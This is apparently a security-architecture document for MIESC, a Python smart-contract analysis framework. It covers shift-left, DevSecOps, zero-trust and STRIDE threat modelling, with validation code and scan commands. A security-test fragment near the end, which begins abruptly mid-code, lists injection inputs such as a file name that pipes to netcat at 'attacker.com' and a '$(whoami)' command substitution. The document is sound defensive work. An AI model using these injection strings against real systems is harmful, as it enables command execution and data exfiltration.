## üéØ Executive Summary

MIESC implements a **defense-in-depth** security architecture incorporating five key security models to ensure the framework itself is secure while analyzing the security of smart contracts. This approach is critical given that MIESC processes potentially malicious code and provides security assessments that influence financial decisions.

### Key Security Principles

1. **Shift-Left Security**: Security integrated from design phase
2. **DevSecOps**: Automated security in CI/CD pipeline
3. **Zero Trust Architecture**: Verify all inputs, trust nothing
4. **Defense in Depth**: Multiple layers of security controls
5. **SAST/DAST Integration**: Static and dynamic security analysis

## üîê Security Models Implementation

### 1. Shift-Left Security (Primary Model)

**Definition**: Integrating security practices early in the SDLC, moving security "left" in the development timeline.

**Implementation in MIESC**:

#### Design Phase Security
- **Threat modeling** before code implementation
- **Security requirements** defined alongside functional requirements
- **Secure architecture patterns** (input validation, output encoding, error handling)
- **Privacy by Design** for user data and analysis results

#### Development Phase Security
- **Secure coding standards** (OWASP, CWE)
- **Input validation** at all entry points
- **Output sanitization** to prevent injection attacks
- **Type safety** with Python type hints and Pydantic models
- **Secrets management** (no hardcoded credentials)

#### Code Review Security
- **Automated SAST** tools (Bandit, Semgrep)
- **Dependency scanning** (Safety, pip-audit)
- **Manual security review** checklist
- **Security-focused unit tests**

**Benefits**:
- üîπ Reduces cost of fixing vulnerabilities (100x cheaper in design vs production)
- üîπ Prevents security debt accumulation
- üîπ Improves developer security awareness
- üîπ Faster time to secure deployment

---

### 2. DevSecOps

**Definition**: Integration of security practices within DevOps processes, making security a shared responsibility.

**Implementation in MIESC**:

#### Continuous Security Integration
```yaml
# .github/workflows/security.yml
Security Pipeline:
  1. Pre-commit hooks ‚Üí Security linting
  2. Git commit ‚Üí SAST scan (Bandit)
  3. Pull request ‚Üí Dependency scan (Safety)
  4. Merge ‚Üí Container security scan
  5. Deploy ‚Üí Runtime security monitoring
```

#### Automated Security Testing
- **SAST**: Bandit for Python code analysis
- **Dependency Check**: Safety for known vulnerabilities
- **Secret Scanning**: detect-secrets for credential leaks
- **Container Scanning**: Trivy for Docker images
- **License Compliance**: pip-licenses for OSS compliance

#### Security Metrics
- Vulnerability count by severity
- Mean time to remediate (MTTR)
- Security test coverage
- False positive rate

**Benefits**:
- üîπ Automated security gates in pipeline
- üîπ Continuous vulnerability detection
- üîπ Faster security feedback loop
- üîπ Compliance as code

---

### 3. Zero Trust Architecture

**Definition**: "Never trust, always verify" - assume breach and verify every request.

**Implementation in MIESC**:

#### API Security
```python
# Every request is validated
class AnalysisRequest(BaseModel):
    contract_code: str = Field(..., max_length=1_000_000)  # Prevent DoS
    analysis_type: str = Field(..., regex="^(slither|mythril|all)$")  # Whitelist
    timeout: int = Field(default=300, ge=10, le=3600)  # Bounded

    @validator('contract_code')
    def validate_contract_code(cls, v):
        # Path traversal prevention
        if '..' in v or v.startswith('/etc'):
            raise ValueError("Invalid file path detected")
        return v
```

#### Input Validation Layers
1. **Schema validation** (Pydantic)
2. **Business logic validation** (custom validators)
3. **Sanitization** (path traversal, command injection prevention)
4. **Rate limiting** (API throttling)
5. **Authentication** (future: API keys, OAuth)

#### Principle of Least Privilege
- Minimal file system permissions
- Sandboxed tool execution
- Container isolation for analysis tools
- No root privileges required

**Benefits**:
- üîπ Prevents injection attacks
- üîπ Mitigates supply chain attacks
- üîπ Reduces attack surface
- üîπ Contains breach impact

---

### 4. Defense in Depth

**Definition**: Multiple layers of security controls to protect against failures in any single layer.

**Implementation in MIESC**:

#### Layer 1: Network Security
- HTTPS/TLS for API communication
- CORS configuration
- Rate limiting
- DDoS protection (via reverse proxy)

#### Layer 2: Application Security
- Input validation (Pydantic schemas)
- Output encoding
- Error handling without information leakage
- Session management (future)

#### Layer 3: Execution Security
- Process isolation for tool execution
- Timeout enforcement
- Resource limits (CPU, memory)
- Temporary file cleanup

#### Layer 4: Data Security
- No persistent storage of sensitive data
- Sanitization of error messages
- Logging without PII
- Audit trail for analysis requests

#### Layer 5: Monitoring & Response
- Logging of security events
- Anomaly detection (future)
- Incident response plan
- Security patch management

**Benefits**:
- üîπ No single point of failure
- üîπ Reduces impact of successful attacks
- üîπ Multiple detection opportunities
- üîπ Resilience to zero-day exploits

---

### 5. SAST/DAST Integration

**Definition**: Combining Static (SAST) and Dynamic (DAST) Application Security Testing.

**Implementation in MIESC**:

#### SAST Tools (Static Analysis)
```bash
# Automated in CI/CD
bandit -r miesc/ -f json -o reports/bandit.json
semgrep --config=auto miesc/
pylint miesc/ --disable=all --enable=security
mypy miesc/ --strict
```

**Checks**:
- Hardcoded secrets
- SQL injection patterns
- Command injection
- Path traversal
- Insecure randomness
- Weak cryptography

#### DAST Tools (Dynamic Analysis)
```bash
# Runtime security testing
pytest miesc/tests/security/ --cov=miesc --cov-report=html
python -m http.server 8000 &
zap-cli quick-scan http://localhost:8000
```

**Checks**:
- Authentication bypass
- Authorization flaws
- Input validation bypass
- Session management
- Error handling
- API security

#### Integration in Test Suite
- **Unit tests**: Security test cases
- **Integration tests**: Attack simulation
- **Fuzzing**: Random input testing
- **Mutation testing**: Test effectiveness

**Benefits**:
- üîπ Comprehensive vulnerability detection
- üîπ Early detection (SAST) + runtime validation (DAST)
- üîπ Compliance with security standards
- üîπ Reduced false positives

## üéØ Threat Modeling

### STRIDE Analysis

| Threat | Impact | Mitigation |
|--------|--------|------------|
| **Spoofing** | Attacker impersonates legitimate user | API authentication, input validation |
| **Tampering** | Modification of analysis results | Input validation, integrity checks |
| **Repudiation** | Deny performing malicious action | Audit logging, non-repudiation |
| **Information Disclosure** | Leak of sensitive contract code | Encryption, access control, no logging of code |
| **Denial of Service** | Make service unavailable | Rate limiting, timeouts, resource limits |
| **Elevation of Privilege** | Gain unauthorized access | Least privilege, sandboxing |

### Attack Surface Analysis

**Entry Points**:
1. ‚úÖ REST API endpoints (`/analyze`, `/verify`, `/classify`)
2. ‚úÖ CLI input (contract file paths, arguments)
3. ‚úÖ Python API (direct function calls)
4. ‚ö†Ô∏è Tool execution (Slither, Mythril subprocess calls)
5. ‚ö†Ô∏è File system operations (reading contracts)

**Trust Boundaries**:
- User input ‚Üí Validation layer ‚Üí Core logic
- Core logic ‚Üí Tool execution ‚Üí Result parsing
- API layer ‚Üí Business logic ‚Üí Response

**High-Risk Components**:
1. **Tool execution** (subprocess, command injection risk)
2. **File path handling** (path traversal risk)
3. **JSON parsing** (deserialization attacks)
4. **Error handling** (information leakage)

        "contract.sol | nc attacker.com 4444",
        "$(whoami).sol"
    ]
    for malicious_input in malicious_inputs:
        with pytest.raises(SecurityError):
            analyze_contract(malicious_input)
```

#### 3. Resource Exhaustion Tests
```python
def test_timeout_enforcement():
    """Ensure timeouts prevent DoS"""
    large_contract = "contract Test { " + "uint x; " * 10000 + "}"
    result = analyze_contract(large_contract, timeout=5)
    assert result['execution_time'] < 6  # 1s buffer
```

#### 4. Error Handling Tests
```python
def test_no_sensitive_data_in_errors():
    """Ensure errors don't leak sensitive info"""
    try:
        analyze_contract("/secure/secret/contract.sol")
    except Exception as e:
        assert "/secure/secret" not in str(e)
        assert "contract.sol" not in str(e)
